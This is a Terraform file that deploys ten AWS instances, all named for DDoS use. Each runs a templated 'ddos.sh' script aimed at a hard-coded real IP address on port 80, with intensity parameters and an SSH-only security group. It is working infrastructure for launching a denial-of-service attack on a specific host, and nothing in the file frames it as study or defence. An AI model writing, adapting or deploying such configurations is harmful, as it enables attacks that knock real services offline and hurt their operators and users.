provider "aws" {
}


resource "aws_instance" "ub_ddos_dyn" {
  count = 10
  ami = "ami-0d527b8c289b4af7f"
  instance_type = "t2.micro"
  tags = {
    Environment = "ub"
    Name        = "ddos_dyn"
  }
  vpc_security_group_ids = [aws_security_group.ssh_ddos_dyn.id]
  user_data = templatefile("./script/ddos.sh.tpl", {
    target = "178.248.232.115",
    port = "80",
    turbo = "135",
    quiet = "1000"
  })
  key_name= "solist-ub"

}

resource "aws_security_group" "ssh_ddos_dyn" {
  name        = "ddos_dyn"
  description = "server ddos dyn"


  ingress {
    description      = "ssh"
    from_port        = 22
    to_port          = 22
    protocol         = "tcp"
    cidr_blocks      = ["185.177.0.0/16"]
  }

  egress {
    from_port        = 0
    to_port          = 0
    protocol         = "-1"
    cidr_blocks      = ["0.0.0.0/0"]
  }

  tags = {
    Name = "ddos-tag"
  }
}
